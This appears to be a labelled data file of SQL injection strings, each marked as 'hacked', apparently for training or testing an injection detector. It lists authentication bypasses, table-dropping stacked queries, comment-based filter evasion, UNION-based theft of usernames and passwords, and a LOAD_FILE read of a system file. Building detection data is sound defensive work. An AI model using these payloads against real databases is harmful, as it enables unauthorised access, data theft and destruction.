Comments	Hacked
DROP sampletable;-- 	1
admin'--	1
SELECT * FROM members WHERE username = 'admin'--' AND password = 'password' 	1
DROP/*comment*/sampletable	1
DR/**/OP/*bypass blacklisting*/sampletable	1
SELECT/*avoid-spaces*/password/**/FROM/**/Members	1
"SELECT /*!32302 1/0, */ 1 FROM tablename"	1
10; DROP TABLE members --	1
"SELECT /*!32302 1/0, */ 1 FROM tablename"	1
/*!32302 10*/	1
"SELECT /*!32302 1/0, */ 1 FROM tablename"	1
SELECT * FROM members; DROP members--	1
10;DROP members --	1
SELECT * FROM products WHERE id = 10; DROP members--	1
"IF(condition,true-part,false-part)"	1
"SELECT IF(1=1,'true','false')"	1
IF condition true-part ELSE false-part	1
IF (1=1) SELECT 'true' ELSE SELECT 'false'	1
BEGIN	1
"IF condition THEN true-part; ELSE false-part; END IF; END;"""	1
IF (1=1) THEN dbms_lock.sleep(3); ELSE dbms_lock.sleep(0); END IF; END;	1
SELECT CASE WEHEN (1=1) THEN 'A' ELSE 'B'END;	1
if ((select user) = 'sa' OR (select user) = 'dbo') select 1 else select 1/0	1
SELECT CHAR(0x66)	1
0xHEXNUMBER	1
SELECT 0x5045	1
SELECT 0x50 + 0x45	1
SELECT login + '-' + password FROM members	1
SELECT login || '-' || password FROM members	1
"SELECT CONCAT(login, password) FROM members"	1
SELECT 0x457578	1
"SELECT CONCAT('0x',HEX('c:\\boot.ini'))"	1
"SELECT CONCAT(CHAR(75),CHAR(76),CHAR(77))"	1
SELECT CHAR(75)+CHAR(76)+CHAR(77)	1
SELECT CHR(75)||CHR(76)||CHR(77)	1
SELECT (CHaR(75)||CHaR(76)||CHaR(77))	1
SELECT LOAD_FILE(0x633A5C626F6F742E696E69)	1
SELECT ASCII('a')	1
SELECT CHAR(64)	1
"SELECT header, txt FROM news UNION ALL SELECT name, pass FROM members"	1
" UNION SELECT 1, 'anotheruser', 'doesnt matter', 1--"	1
field COLLATE SQL_Latin1_General_Cp1254_CS_AS	1
SELECT header FROM news UNION ALL SELECT name COLLATE SQL_Latin1_General_Cp1254_CS_AS FROM members	1
Hex()	1
admin' --	1
admin'/*	1
 or 1=1	1
 or 1=1/*	1
) or '1'='1	1
) or ('1'='1	1
"admin' AND 1=0 UNION ALL SELECT 'admin', '81dc9bdb52d04dc20036dbd8313ed055'"	1
 HAVING 1=1	1
 GROUP BY table.columnfromerror1 HAVING 1=1 --	1
" GROUP BY table.columnfromerror1, columnfromerror2 HAVING 1=1 --"	1
" GROUP BY table.columnfromerror1, columnfromerror2, columnfromerror(n) HAVING 1=1 --"	1
ORDER BY 1	1
 union select sum(columntofind) from users--	1
"Microsoft OLE DB Provider for ODBC Drivers error '80040e07'"""	1
"SELECT * FROM Table1 WHERE id = -1 UNION ALL SELECT null, null, NULL, NULL, convert(image,1), null, null,NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULl, NULL--"	1
"11223344) UNION SELECT NULL,NULL,NULL,NULL WHERE 1=2"	1
"11223344) UNION SELECT 1,NULL,NULL,NULL WHERE 1=2"	1
